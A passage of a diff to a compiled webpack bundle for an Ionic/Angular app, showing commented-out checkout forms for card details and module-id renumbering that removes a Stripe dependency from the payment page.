    <ion-col col-12 col-sm col-lg-6>\n        <ion-item>\n          <ion-label stacked>CARD EXPIRY YEAR</ion-label>\n          <ion-input  type="number" [(ngModel)]="card.expiyear"></ion-input>\n        </ion-item>\n    </ion-col>\n    <ion-col col-12 col-sm col-lg-6>\n        <ion-item>\n          <ion-label stacked>CARD EXPIRY MONTH</ion-label>\n          <ion-input  type="number" [(ngModel)]="card.expimonth"></ion-input>\n        </ion-item>\n    </ion-col>\n\n    <ion-col col-12 col-sm col-lg-6>\n        <ion-item>\n          <ion-label stacked>CARD CVC</ion-label>\n          <ion-input  type="number" [(ngModel)]="card.cvc"></ion-input>\n        </ion-item>\n    </ion-col>\n</ion-row>\n    <ion-row>\n        <ion-col col-sm-8 col-lg-4 offset-lg-4>\n          <button ion-button full  (click)="payer()">VALIDER</button>\n        </ion-col>\n        <ion-col col-sm-8 col-lg-4 offset-4>\n         \n        </ion-col>\n      </ion-row>\n    -->\n\n\n\n\n\n <!-- <form [formGroup]="cardes" (ngSubmit)="logForm()">\n    <ion-row>\n  <ion-col col-sm-12 col-lg-6 >\n    <ion-item>\n        <ion-label>CARD NUMBER</ion-label>\n        <ion-input type="number" formControlName="cardnumber"></ion-input>\n     </ion-item>\n        <ion-item>\n            <ion-label>CARD EXPIRY MONTH</ion-label>\n            <ion-input type="number" formControlName="expinumbermonth"></ion-input>\n        </ion-item>\n    </ion-col>\n    </ion-row>\n     <ion-item>\n            <ion-label>CARD EXPIRY YEAR</ion-label>\n            <ion-input type="number" formControlName="expinumber"></ion-input>\n     </ion-item>\n    \n     <ion-item>\n            <ion-label>CARD CVC</ion-label>\n            <ion-input type="number" formControlName="cardcvc"></ion-input>\n     </ion-item>\n\n\n     <button ion-button type="submit" [disabled]="!cardes.valid">Submit</button>\n\n</form>\n\n-->\n\n\n\n\n\n\n<!-- \n  <form [formGroup]="formgroup" (ngSubmit)="onSubmit(form)">\n \n     <ion-list>\n       <ion-item [ngClass]="{\'error-border\':!formgroup.controls.firstname.valid && formgroup.controls.firstname.touched}">\n            <ion-label floating>First Name</ion-label>\n            <ion-input formControlName="firstname" type="text"></ion-input>\n        </ion-item>\n        <ion-item *ngIf="firstname.hasError(\'required\') && firstname.touched">\n            <p class="para"> *FirstName is required</p>\n        </ion-item>\n        <ion-item *ngIf="firstname.hasError(\'minlength\') && firstname.touched">\n            <p class="para">Sorry, minimum password firstname is 3!</p>\n        </ion-item>\n        <ion-item *ngIf="firstname.hasError(\'maxlength\') && firstname.touched">\n            <p class="para">Sorry, maxlength firstname length is 20!</p>\n        </ion-item>\n        <ion-item *ngIf="firstname.hasError(\'pattern\') && firstname.touched">\n            <p class="para">Sorry, pas de caractéres spéciaux</p>\n        </ion-item>\n  \n\n        <ion-item>\n            <ion-label floating>Last Name</ion-label>\n            <ion-input formControlName="lastname" type="text"></ion-input>\n        </ion-item>\n        <ion-item *ngIf="lastname.hasError(\'required\') && lastname.touched ">\n            <p class="para"> *LastName is required</p>\n        </ion-item>\n        <ion-item *ngIf="lastname.hasError(\'minlength\') && lastname.touched">\n            <p class="para">Sorry, minimum password length is 3!</p>\n        </ion-item>\n        <ion-item *ngIf="lastname.hasError(\'maxlength\') && lastname.touched">\n            <p class="para">Sorry, maxlength lastname length is 20!</p>\n        </ion-item>\n        <ion-item *ngIf="lastname.hasError(\'pattern\') && firstname.touched">\n            <p class="para">Sorry, pas de caractéres spéciaux</p>\n        </ion-item>\n    -->\n\n    <!--    <ion-item>\n            <ion-label floating>Card Number</ion-label>\n            <ion-input formControlName="cardnumber" type="number"></ion-input>\n        </ion-item>\n        <ion-item *ngIf="cardnumber.hasError(\'required\') && cardnumber.touched">\n            <p> *Age is required</p>\n        </ion-item>\n        <ion-item *ngIf="cardnumber.hasError(\'maxlength\') && cardnumber.touched">\n            <p> *only to number</p>\n        </ion-item>\n        \n        <ion-item>\n            <ion-label floating>Card Expiration Year</ion-label>\n            <ion-input formControlName="expinumber" type="number"></ion-input>\n        </ion-item>\n        <ion-item *ngIf="expinumber.hasError(\'required\') && cardnumber.touched">\n            <p> *expinumber is required</p>\n        </ion-item>\n        <ion-item *ngIf="expinumber.hasError(\'maxlength\') && expinumber.touched">\n            <p> *only to number</p>\n        </ion-item>\n\n        <ion-item>\n            <ion-label floating>Card Expiration Month</ion-label>\n            <ion-input formControlName="expinumbermonth" type="number"></ion-input>\n        </ion-item>\n        <ion-item *ngIf="expinumbermonth.hasError(\'required\') && expinumbermonth.touched">\n            <p> *expinumber is required</p>\n        </ion-item>\n        <ion-item *ngIf="expinumbermonth.hasError(\'maxlength\') && expinumbermonth.touched">\n            <p> *only to number</p>\n        </ion-item>\n\n        <ion-item>\n            <ion-label floating>CVC</ion-label>\n            <ion-input formControlName="cardcvc" type="number"></ion-input>\n        </ion-item>\n        <ion-item *ngIf="cardcvc.hasError(\'required\') && cardcvc.touched">\n            <p> *expinumber is required</p>\n        </ion-item>\n        <ion-item *ngIf="cardcvc.hasError(\'maxlength\') && cardcvc.touched">\n            <p> *only to number</p>\n        </ion-item>\n\n\n\n     </ion-list>\n     <button ion-button  color="secondary"  style="margin-top: 20px; width: 250px;" type="submit" >Submit</button>\n  </form>\n  <ion-row>\n        <ion-col col-sm-6 col-md-4 col-lg-4 offset-lg-4 offset-md-4 offset-sm-3> \n            <h1>Checkout</h1>\n            <h4>Your Total: $</h4>\n            \n        </ion-col>\n    </ion-row>\n  <form method="post" action="https://www.my-dohone.com/dohone/pay">\n    <ion-row>\n        <ion-col col-xs-12 col-lg-6 offset-lg-5>\n            <div>\n               \n                <input type="text" id="name" class="formu" placeholder="Name" required>\n            </div>\n        </ion-col>\n        <ion-col col-xs-12 col-lg-6 offset-lg-5>\n                <div>\n                    <input type="text" id="adress" class="formu" placeholder="adresse" required>\n                </div>\n        </ion-col>\n        <ion-col col-xs-12 col-lg-6 offset-lg-5>\n                <div>\n                    <input type="text" id="oldername" class="formu" placeholder="older name" required>\n                </div>\n        </ion-col>\n        <ion-col col-xs-12 col-lg-6 offset-lg-5>\n                <div>\n                    \n                    <input type="number" id="card-number" class="formu" placeholder="credit card number" required>\n                </div>\n        </ion-col>\n        <ion-col col-xs-12 col-lg-3 offset-lg-5>\n                <div>\n                    <input type="number" id="expiartion" class="formu" placeholder="Expiration Mounth" required>\n                </div>\n        </ion-col>\n        <ion-col col-xs-12 col-lg-3 >\n                <div>\n                    <input type="number" id="expiartiony" class="formu" placeholder="Expiration Year" required>\n                </div>\n        </ion-col>\n        <ion-col col-xs-12 col-lg-6 offset-lg-5>\n                <div>\n                    <input type="number" id="cvs" class="formu" placeholder="CVS" required>\n                </div>\n        </ion-col>\n        <ion-col col-xs-12 col-lg-6 offset-lg-5>\n                <button ion-button  color="secondary"  style="margin-top: 20px; width: 250px;" type="submit" >Submit</button>\n        </ion-col>\n    </ion-row>\n \n</form>  -->\n\n\n</ion-grid>\n\n\n\n</ion-content>\n'/*ion-inline-end:"C:\Users\erico\angular4app\lehub\hub\src\pages\payement\payement.html"*/,
         }),
         __metadata("design:paramtypes", [__WEBPACK_IMPORTED_MODULE_1_ionic_angular__["h" /* NavController */], __WEBPACK_IMPORTED_MODULE_1_ionic_angular__["i" /* NavParams */], __WEBPACK_IMPORTED_MODULE_2__angular_forms__["a" /* FormBuilder */], __WEBPACK_IMPORTED_MODULE_1_ionic_angular__["g" /* LoadingController */],
-            __WEBPACK_IMPORTED_MODULE_1_ionic_angular__["a" /* AlertController */], __WEBPACK_IMPORTED_MODULE_4__angular_http__["b" /* Http */], __WEBPACK_IMPORTED_MODULE_6__ionic_native_stripe__["a" /* Stripe */], __WEBPACK_IMPORTED_MODULE_1_ionic_angular__["j" /* Platform */]])
+            __WEBPACK_IMPORTED_MODULE_1_ionic_angular__["a" /* AlertController */], __WEBPACK_IMPORTED_MODULE_4__angular_http__["b" /* Http */], __WEBPACK_IMPORTED_MODULE_1_ionic_angular__["j" /* Platform */]])
     ], PayementPage);
     return PayementPage;
 }());
@@ -324,13 +380,13 @@ module.exports = webpackAsyncContext;
 
 /***/ }),
 
-/***/ 199:
+/***/ 198:
 /***/ (function(module, __webpack_exports__, __webpack_require__) {
 
 "use strict";
 Object.defineProperty(__webpack_exports__, "__esModule", { value: true });
-/* harmony import */ var __WEBPACK_IMPORTED_MODULE_0__angular_platform_browser_dynamic__ = __webpack_require__(200);
-/* harmony import */ var __WEBPACK_IMPORTED_MODULE_1__app_module__ = __webpack_require__(221);
+/* harmony import */ var __WEBPACK_IMPORTED_MODULE_0__angular_platform_browser_dynamic__ = __webpack_require__(199);
+/* harmony import */ var __WEBPACK_IMPORTED_MODULE_1__app_module__ = __webpack_require__(220);
 
 
 Object(__WEBPACK_IMPORTED_MODULE_0__angular_platform_browser_dynamic__["a" /* platformBrowserDynamic */])().bootstrapModule(__WEBPACK_IMPORTED_MODULE_1__app_module__["a" /* AppModule */]);
@@ -338,7 +394,7 @@ Object(__WEBPACK_IMPORTED_MODULE_0__angular_platform_browser_dynamic__["a" /* pl
 
 /***/ }),
 
-/***/ 221:
+/***/ 220:
 /***/ (function(module, __webpack_exports__, __webpack_require__) {
 
 "use strict";
@@ -346,14 +402,14 @@ Object(__WEBPACK_IMPORTED_MODULE_0__angular_platform_browser_dynamic__["a" /* pl
 /* harmony import */ var __WEBPACK_IMPORTED_MODULE_0__angular_platform_browser__ = __webpack_require__(26);
 /* harmony import */ var __WEBPACK_IMPORTED_MODULE_1__angular_core__ = __webpack_require__(0);
 /* harmony import */ var __WEBPACK_IMPORTED_MODULE_2_ionic_angular__ = __webpack_require__(29);
-/* harmony import */ var __WEBPACK_IMPORTED_MODULE_3__ionic_native_splash_screen__ = __webpack_require__(197);
-/* harmony import */ var __WEBPACK_IMPORTED_MODULE_4__ionic_native_status_bar__ = __webpack_require__(198);
-/* harmony import */ var __WEBPACK_IMPORTED_MODULE_5__app_component__ = __webpack_require__(274);
-/* harmony import */ var __WEBPACK_IMPORTED_MODULE_6__pages_home_home__ = __webpack_require__(275);
+/* harmony import */ var __WEBPACK_IMPORTED_MODULE_3__ionic_native_splash_screen__ = __webpack_require__(195);
+/* harmony import */ var __WEBPACK_IMPORTED_MODULE_4__ionic_native_status_bar__ = __webpack_require__(197);
+/* harmony import */ var __WEBPACK_IMPORTED_MODULE_5__app_component__ = __webpack_require__(273);
+/* harmony import */ var __WEBPACK_IMPORTED_MODULE_6__pages_home_home__ = __webpack_require__(274);
 /* harmony import */ var __WEBPACK_IMPORTED_MODULE_7__pages_first_first__ = __webpack_require__(100);
 /* harmony import */ var __WEBPACK_IMPORTED_MODULE_8__pages_payement_payement__ = __webpack_require__(101);
 /* harmony import */ var __WEBPACK_IMPORTED_MODULE_9__angular_http__ = __webpack_require__(155);
-/* harmony import */ var __WEBPACK_IMPORTED_MODULE_10__ionic_native_stripe__ = __webpack_require__(156);
+/* harmony import */ var __WEBPACK_IMPORTED_MODULE_10__ionic_native_stripe__ = __webpack_require__(275);
 var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
     var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
     if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
@@ -412,15 +468,15 @@ var AppModule = /** @class */ (function () {
 
 /***/ }),
 
-/***/ 274:
+/***/ 273:
 /***/ (function(module, __webpack_exports__, __webpack_require__) {
 
 "use strict";
 /* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "a", function() { return MyApp; });
 /* harmony import */ var __WEBPACK_IMPORTED_MODULE_0__angular_core__ = __webpack_require__(0);
 /* harmony import */ var __WEBPACK_IMPORTED_MODULE_1_ionic_angular__ = __webpack_require__(29);
-/* harmony import */ var __WEBPACK_IMPORTED_MODULE_2__ionic_native_status_bar__ = __webpack_require__(198);
-/* harmony import */ var __WEBPACK_IMPORTED_MODULE_3__ionic_native_splash_screen__ = __webpack_require__(197);
+/* harmony import */ var __WEBPACK_IMPORTED_MODULE_2__ionic_native_status_bar__ = __webpack_require__(197);
+/* harmony import */ var __WEBPACK_IMPORTED_MODULE_3__ionic_native_splash_screen__ = __webpack_require__(195);
 /* harmony import */ var __WEBPACK_IMPORTED_MODULE_4__pages_first_first__ = __webpack_require__(100);
 var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
     var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
@@ -464,7 +520,7 @@ var MyApp = /** @class */ (function () {
 
 /***/ }),
 
-/***/ 275:
+/***/ 274:
 /***/ (function(module, __webpack_exports__, __webpack_require__) {
 
 "use strict";
@@ -499,5 +555,5 @@ var HomePage = /** @class */ (function () {
 
 /***/ })
 
-},[199]);
+},[198]);
 //# sourceMappingURL=main.js.map
